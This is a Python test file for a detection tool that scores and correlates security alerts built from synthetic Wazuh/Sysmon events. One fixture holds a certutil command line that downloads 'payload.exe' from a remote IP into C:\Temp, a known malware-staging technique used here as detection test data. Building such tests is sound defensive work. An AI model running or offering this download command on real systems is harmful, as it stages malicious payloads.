"""Tests for case-level actionability scoring."""

from case_scoring import score_case
from normalizer import normalize_alert
from scoring import calculate_score

GUID_CERTUTIL = "{d1fc117c-9253-6ab2-a649-00000000a401}"
GUID_PARENT = "{d1fc117c-b114-6aa9-7e00-00000000a401}"


def make_event(event_id, timestamp, guid=None, parent_guid=None, image=None,
               parent_image=None, command_line=None, user=None, hashes=None,
               destination_ip=None, destination_port=None, protocol=None,
               technique="T1105", host="WIN-THESIS-01"):
    eventdata = {
        "processGuid": guid,
        "parentProcessGuid": parent_guid,
        "image": image,
        "parentImage": parent_image,
        "commandLine": command_line,
        "parentCommandLine": parent_image and command_line,
        "user": user,
        "hashes": hashes,
        "destinationIp": destination_ip,
        "destinationPort": destination_port,
        "protocol": protocol,
    }
    eventdata = {k: v for k, v in eventdata.items() if v is not None}
    return {
        "_id": f"{event_id}:{timestamp}:{guid}",
        "_index": "wazuh-archives-4.x-test",
        "@timestamp": timestamp,
        "agent": {"name": host},
        "rule": {"level": 10, "mitre": {"id": [technique]}},
        "data": {"win": {"system": {"eventID": str(event_id)}, "eventdata": eventdata}},
    }


def network_event():
    return make_event(
        3, "2026-09-22T14:36:02.581Z", guid=GUID_CERTUTIL,
        image=r"C:\Windows\System32\certutil.exe", user="WIN-THESIS-01\\kevin",
        destination_ip="185.220.101.34", destination_port="80", protocol="tcp",
    )


def process_event():
    return make_event(
        1, "2026-09-22T14:36:02.574Z", guid=GUID_CERTUTIL, parent_guid=GUID_PARENT,
        image=r"C:\Windows\System32\certutil.exe", parent_image=r"C:\Windows\System32\cmd.exe",
        command_line="certutil -urlcache -split -f http://185.220.101.34/payload.exe C:\\Temp\\p.exe",
        user="WIN-THESIS-01\\kevin",
        hashes="SHA256=" + "C" * 64, protocol=None,
    )


def test_correlation_adds_evidence_to_case_score():
    seed = normalize_alert(network_event())
    process = normalize_alert(process_event())
    alert_score = calculate_score(network_event())["total_score"]

    single = score_case([seed], [], seed["id"])
    correlated = score_case(
        [seed, process],
        [{"source": seed["id"], "target": process["id"], "relation": "PROCESS_CONNECTED_TO", "confidence": 1.0, "identity_backed": True}],
        seed["id"],
    )

    assert single["case_score"] < alert_score
    assert correlated["case_score"] > single["case_score"]
    assert correlated["case_score"] >= alert_score
    assert correlated["required_coverage"] > single["required_coverage"]


def test_repeated_evidence_is_deduplicated_and_capped():
    seed = normalize_alert(network_event())
    clones = [normalize_alert(network_event()) for _ in range(3)]
    for index, clone in enumerate(clones):
        clone["id"] = f"clone-{index}"
        clone["timestamp"] = f"2026-09-22T14:36:0{index}.000Z"

    edges = [
        {
            "source": seed["id"],
            "target": clone["id"],
            "relation": "SAME_PROCESS",
            "confidence": 0.9,
            "expand": True,
            "identity_backed": True,
        }
        for clone in clones
    ]
    result = score_case([seed] + clones, edges, seed["id"])

    assert result["case_score"] <= 100.0
    destination = next(fact for fact in result["facts"] if fact["field"] == "destinationIp")
    assert destination["completeness"] == 1.0
    assert destination["consistency"] == 1.0
    assert destination["contribution"] < destination["weight"] * 1.0 + 1e-9


def test_weak_context_corroboration_is_discounted():
    from case_scoring import score_case as score

    seed = normalize_alert(network_event())
    clone = normalize_alert(network_event())
    clone["id"] = "weak-clone"
    clone["timestamp"] = "2026-09-22T14:36:04.000Z"
    edges = [
        {
            "source": seed["id"],
            "target": clone["id"],
            "relation": "SUPPORTING_CONTEXT",
            "confidence": 0.9,
            "expand": False,
        }
    ]
    result = score([seed, clone], edges, seed["id"])
    destination = next(fact for fact in result["facts"] if fact["field"] == "destinationIp")
    assert destination["consistency"] < 0.8
    assert destination["carriers"][1]["identity_backed"] is False


def test_context_leaves_are_capped():
    from case_scoring import MAX_CONTEXT_LEAVES_PER_NODE, case_from_graph, score_graph_case
    from correlation import build_correlation_graph, build_timeline_with_edges

    seed_raw = make_event(
        1, "2026-09-22T10:00:00.000Z", guid="{aaaa0000-0000-0000-0000-000000000001}",
        image=r"C:\seed.exe", user="x\\bob", command_line="seed.exe",
    )
    alerts = [seed_raw]
    for index in range(8):
        alerts.append(
            make_event(
                1,
                f"2026-09-22T10:00:{index + 1:02d}.000Z",
                guid=f"{{bbbb0000-0000-0000-0000-0000000000{index:02d}}}",
                image=rf"C:\ctx{index}.exe",
                user="x\\bob",
                command_line=f"ctx{index}.exe",
            )
        )

    graph = build_correlation_graph(alerts)
    seed_id = normalize_alert(seed_raw)["id"]
    nodes, _ = case_from_graph(graph, seed_id)
    assert len(nodes) <= 1 + MAX_CONTEXT_LEAVES_PER_NODE
    timeline = build_timeline_with_edges(graph, seed_id)
    assert len(timeline["nodes"]) <= 1 + MAX_CONTEXT_LEAVES_PER_NODE
    node_ids = {node["id"] for node in timeline["nodes"]}
    assert all(edge["source"] in node_ids and edge["target"] in node_ids for edge in timeline["edges"])
    score = score_graph_case(graph, seed_id)
    assert score["evidence_events"] == score["nodes"]
    assert score["aggregated_evidence_events"] == 0


def test_invalid_ip_reduces_validity():
    seed = normalize_alert(network_event())
    valid = score_case([seed], [], seed["id"])
    broken_raw = network_event()
    broken_raw["data"]["win"]["eventdata"]["destinationIp"] = "185.220.101.34.999"
    broken = score_case([normalize_alert(broken_raw)], [], normalize_alert(broken_raw)["id"])

    valid_fact = next(fact for fact in valid["facts"] if fact["field"] == "destinationIp")
    broken_fact = next(fact for fact in broken["facts"] if fact["field"] == "destinationIp")
    assert valid_fact["validity"] == 1.0
    assert broken_fact["validity"] == 0.0
    assert broken["case_score"] < valid["case_score"]


def test_placeholder_string_is_not_case_evidence():
    raw = network_event()
    raw["data"]["win"]["eventdata"]["destinationIp"] = "-"
    normalized = normalize_alert(raw)
    result = score_case([normalized], [], normalized["id"])
    fact = next(item for item in result["facts"] if item["field"] == "destinationIp")
    assert fact["completeness"] == 0.0
    assert fact["carriers"] == []


def test_required_coverage_uses_technique_profile():
    seed = normalize_alert(network_event())
    result = score_case([seed], [], seed["id"])
    assert result["required_total"] > 0
    assert 0.0 <= result["required_coverage"] < 1.0

    process = normalize_alert(process_event())
    full = score_case(
        [seed, process],
        [{"source": seed["id"], "target": process["id"], "relation": "PROCESS_CONNECTED_TO", "confidence": 1.0, "identity_backed": True}],
        seed["id"],
    )
    assert full["required_coverage"] == 1.0


def test_facts_expose_provenance_carriers():
    seed = normalize_alert(network_event())
    result = score_case([seed], [], seed["id"])
    destination = next(fact for fact in result["facts"] if fact["field"] == "destinationIp")
    assert destination["carriers"][0]["event_id"] == seed["id"]
    assert destination["carriers"][0]["value"] == "185.220.101.34"
    assert destination["carriers"][0]["source_index"] == "wazuh-archives-4.x-test"
    assert destination["carriers"][0]["source_id"] == seed["source_id"]
    assert destination["role"] == "required"


def test_expansion_fact_aggregation_preserves_omitted_carriers_for_scoring():
    from case_scoring import score_expansion_case
    from correlation import expand_case

    digest = "SHA256=" + "D" * 64
    seed_raw = make_event(
        1, "2026-09-22T10:00:00.000Z", guid="{11111111-1111-1111-1111-111111111111}",
        image=r"C:\Tools\tool.exe", hashes=digest, user=None, technique="T9999",
    )
    representative_raw = make_event(
        1, "2026-09-22T10:00:01.000Z", guid="{22222222-2222-2222-2222-222222222222}",
        image=r"C:\Tools\tool.exe", hashes=digest, user=None, technique="T9999",
    )
    aggregated_raw = make_event(
        1, "2026-09-22T10:00:02.000Z", guid="{33333333-3333-3333-3333-333333333333}",
        image=r"C:\Tools\tool.exe", hashes=digest, user="LAB\\alice", technique="T9999",
    )
    dataset = [seed_raw, representative_raw, aggregated_raw]

    def fake_search(pivot):
        if pivot["field"] != "file.hash.sha256":
            return []
        return [
            raw for raw in dataset
            if raw["data"]["win"]["eventdata"].get("hashes", "").lower().endswith(pivot["value"])
        ]

    expansion = expand_case(seed_raw, fake_search, max_nodes=20)
    assert expansion["stats"]["aggregated"] == 1
    assert len(expansion["nodes"]) == 2
    assert expansion["edges"][0]["occurrences"] == 2
    assert len(expansion["edges"][0]["aggregated_events"]) == 1

    scored = score_expansion_case(expansion)
    user_fact = next(fact for fact in scored["facts"] if fact["field"] == "user")
    assert user_fact["completeness"] == 1.0
    assert any(carrier["value"] == "LAB\\alice" for carrier in user_fact["carriers"])
    assert scored["nodes"] == 2  # graph representatives
    assert scored["evidence_events"] == 3  # includes the aggregated carrier


def test_case_evidence_confidence_uses_path_not_max_incident_edge():
    from case_scoring import _build_adjacency

    edges = [
        {"source": "seed", "target": "middle", "confidence": 0.9, "identity_backed": True},
        {"source": "middle", "target": "leaf", "confidence": 0.8, "identity_backed": True},
        {"source": "leaf", "target": "other", "confidence": 1.0, "identity_backed": True},
    ]
    adjacency = _build_adjacency(edges, "seed")
    assert abs(adjacency["leaf"]["confidence"] - 0.72) < 1e-9
    assert abs(adjacency["leaf"]["identity_confidence"] - 0.72) < 1e-9
    # The strongest edge incident to leaf is 1.0, but it is not the confidence
    # of the evidence path from the seed.
